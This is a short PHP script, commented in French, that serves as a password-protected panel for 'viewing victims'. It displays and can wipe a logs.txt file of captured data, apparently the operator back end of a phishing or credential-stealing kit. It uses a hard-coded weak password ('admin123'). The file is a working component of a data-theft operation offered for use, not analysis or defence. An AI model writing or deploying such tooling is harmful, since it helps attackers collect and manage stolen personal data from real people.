<?php
// Panneau pour consulter les victimes - accessible uniquement avec le bon mot de passe
$pass = 'admin123';
session_start();

if (!isset($_SESSION['ok']) && (!isset($_POST['pass']) || $_POST['pass'] !== $pass)) {
    echo '<form method="POST"><input type="password" name="pass" placeholder="Mot de passe"><button type="submit">Entrer</button></form>';
    exit;
}
$_SESSION['ok'] = true;$logs = file_exists('logs.txt') ? file_get_contents('logs.txt') : 'Aucune victime pour le moment.';
echo '<pre>' . htmlspecialchars($logs) . '</pre>';
echo '<p><a href="?reset=1">Vider les logs</a></p>';
if (isset($_GET['reset'])) file_put_contents('logs.txt', '');
?>
